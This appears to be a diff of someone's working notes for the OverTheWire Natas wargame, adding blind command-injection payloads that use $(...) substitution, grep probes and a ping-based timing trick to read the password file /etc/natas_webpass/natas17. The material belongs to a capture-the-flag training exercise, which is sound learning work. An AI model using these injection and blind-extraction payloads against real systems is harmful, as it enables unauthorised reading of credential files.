@@ -53,3 +53,14 @@ http://natas.labs.overthewire.org:80/js/    forbidden
 
 
 $(timeout $(wc -c < /etc/natas_webpass/natas17) ping 8.8.8.8)
+
+grep -i d $(cat cmd.txt)
+
+d $(echo /etc/natas_webpass/natas17) #
+d $(echo dictionary.txt) #
+
+African$(grep a /etc/natas_webpass/natas17)
+
+African$(grep ^a /etc/natas_webpass/natas17)
+
+*=> After all the hastle the blind happens to be here....
